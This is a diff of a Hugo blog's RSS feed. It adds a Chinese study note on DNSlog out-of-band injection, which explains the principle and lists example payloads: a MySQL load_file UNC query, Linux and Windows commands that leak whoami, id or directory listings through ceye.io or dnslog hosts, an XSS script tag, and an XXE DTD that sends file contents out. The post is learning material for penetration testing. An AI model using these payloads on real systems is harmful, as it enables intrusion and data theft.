@@ -6,7 +6,7 @@
         <description>Recent content on 茄子的养殖场</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Thu, 12 May 2022 23:31:13 +0800</lastBuildDate><atom:link href="https://proben1.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Tue, 17 May 2022 21:55:19 +0800</lastBuildDate><atom:link href="https://proben1.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>茄科生物观测日志</title>
         <link>https://proben1.github.io/2021/%E8%8C%84%E7%A7%91%E7%94%9F%E7%89%A9%E8%A7%82%E6%B5%8B%E6%97%A5%E5%BF%97/</link>
         <pubDate>Mon, 06 Dec 2021 12:08:35 +0800</pubDate>
@@ -92,6 +92,97 @@
 &lt;p&gt;最近是没时间玩游戏了，亏我还买了大表哥，无主之地，蔚蓝，还给龙脉唱歌加了愿望单，幸运的话大四之前可以全玩完？呜呜呜！&lt;/p&gt;
 &lt;p&gt;好好学习！打游戏可以再造个自己去玩？&lt;/p&gt;
 &lt;p&gt;（昨天素材太好了，忍不住记一下，详见2021-12-05）&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>DNSlog注入</title>
+        <link>https://proben1.github.io/2022/dnslog%E6%B3%A8%E5%85%A5/</link>
+        <pubDate>Tue, 17 May 2022 21:55:19 +0800</pubDate>
+        
+        <guid>https://proben1.github.io/2022/dnslog%E6%B3%A8%E5%85%A5/</guid>
+        <description>&lt;h1 id=&#34;dnslog注入学习&#34;&gt;DNSlog注入学习&lt;/h1&gt;
+&lt;h3 id=&#34;前置&#34;&gt;前置&lt;/h3&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/m0_37263637/article/details/85157611&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;域名分级与域名解析过程(DNS)&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;读完之后可以感受到，从用户到本地DNS服务器使用的是递归查询，递归的是本地DNS服务器帮你去迭代查询。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://pic.imgdb.cn/item/62839ec50947543129b13f5b.jpg&#34; &gt;
+		&lt;img src=&#34;https://pic.imgdb.cn/item/62839ec50947543129b13f5b.jpg&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;其中，红色部分是可控的。我们只需要弄一个红色部分的DNS服务器，就得到DNS的解析日志。&lt;/p&gt;
+&lt;p&gt;红色部分哪里来？自己搭建去（不一定），可以用下面的网站。&lt;/p&gt;
+&lt;h3 id=&#34;网站&#34;&gt;网站&lt;/h3&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://www.dnslog.cn/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://www.dnslog.cn/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://ceye.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://ceye.io/&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;原理&#34;&gt;原理&lt;/h3&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/Xy--1/p/12896599.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;DNS注入&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;上面这些讲的很清楚，这里再用自己的话总结一下，就以Sql的利用为例子：&lt;/p&gt;
+&lt;p&gt;在权限（文件可读）、环境（secure_file_priv）、长度（max_allowed_packet）都满足的情况下，在通过LOAD-FILE等文件函数进行读写时，整了个UCN路径，UCN路径构建DNS服务器地址，假装访问文件，产生DNSlog，就是这个DNSlog可以夹带私货，比如&lt;/p&gt;
+
+
+
+&lt;div class=&#34;notice notice-tip&#34; &gt;
+    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;select load_file(concat(&amp;rsquo;\\&amp;rsquo;,(select database()),&amp;rsquo;.xxxx.ceye.io\abc&amp;rsquo;))&lt;/p&gt;&lt;/div&gt;
+
+&lt;p&gt;UNC路径的理解（Universal Naming Convention）&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://pic.imgdb.cn/item/627e4754094754312924bd43.jpg&#34; &gt;
+		&lt;img src=&#34;https://pic.imgdb.cn/item/627e4754094754312924bd43.jpg&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;利用&#34;&gt;利用&lt;/h3&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/column/184587.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;使用DNSLOG拯救你的盲打盲注&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://www.admintony.com/DNSLog%E5%9C%A8%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;DNSLog在渗透中的使用&lt;/a&gt;&lt;/p&gt;
+&lt;h4 id=&#34;1sql注入中的盲注&#34;&gt;1.SQL注入中的盲注&lt;/h4&gt;
+&lt;h4 id=&#34;2无回显的命令执行&#34;&gt;2.无回显的命令执行&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;Linux&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ping &lt;span style=&#34;color:#f1fa8c&#34;&gt;`&lt;/span&gt;whoami&lt;span style=&#34;color:#f1fa8c&#34;&gt;`&lt;/span&gt;.xxxx.ceye.io
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; curl http://haha.xxx.ceye.io/&lt;span style=&#34;color:#f1fa8c&#34;&gt;`&lt;/span&gt;whoami&lt;span style=&#34;color:#f1fa8c&#34;&gt;`&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;像这里还有复杂点的，base64，多行输出等等&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl http://xxx.dnslog.link/&lt;span style=&#34;color:#ff79c6&#34;&gt;$(&lt;/span&gt;id|base64|tr &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i in &lt;span style=&#34;color:#ff79c6&#34;&gt;$(&lt;/span&gt;ls /&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt;;&lt;span style=&#34;color:#ff79c6&#34;&gt;do&lt;/span&gt; curl &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;http://&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$i&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;.xxx.dnslog.link/&amp;#34;&lt;/span&gt;;&lt;span style=&#34;color:#ff79c6&#34;&gt;done&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Windows&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ping &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;%USERNAME%&lt;/span&gt;.xxx.ceye.io
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里也有复杂点的，其实都是配合命令行来&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;获取计算机名：for /F &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;delims=\&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;%i in (&amp;#39;whoami&amp;#39;) do ping -n 1 %&lt;/span&gt;i.xxx.dnslog.link
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;获取用户名：for /F &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;delims=\ tokens=2&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;%i in (&amp;#39;whoami&amp;#39;) do ping -n 1 %&lt;/span&gt;i.xxx.dnslog.link
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;3无回显ssrf&#34;&gt;3.无回显SSRF&lt;/h4&gt;
+&lt;p&gt;基本是把url换成想要的SSRF.xxxx.ceye.io&lt;/p&gt;
+&lt;h4 id=&#34;4xss跨站&#34;&gt;4.XSS跨站&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt;script src&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;http&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;//XSS.XXXXX.ceye.io&amp;gt;&amp;lt;/script&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;5xxe&#34;&gt;5.XXE&lt;/h4&gt;
+&lt;p&gt;改dtd：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-dtd&#34; data-lang=&#34;dtd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;!ENTITY&lt;/span&gt; % all
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;lt;!ENTITY % send SYSTEM &amp;#39;http://xxxx.ceye.io/%file;&amp;#39;&amp;gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;%all;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;tips&#34;&gt;Tips&lt;/h3&gt;
+&lt;p&gt;**为什么要使用DNS注入？**同学面试的时候被问过，原话是：除了上述这些（报错，盲注等）注入，sql注入有没有啥快速跑出来的方法？&lt;/p&gt;
+&lt;p&gt;盲注跑数据太慢的情况下，可以选择&lt;strong&gt;DNS&lt;/strong&gt;注入。&lt;/p&gt;
 </description>
         </item>
         <item>
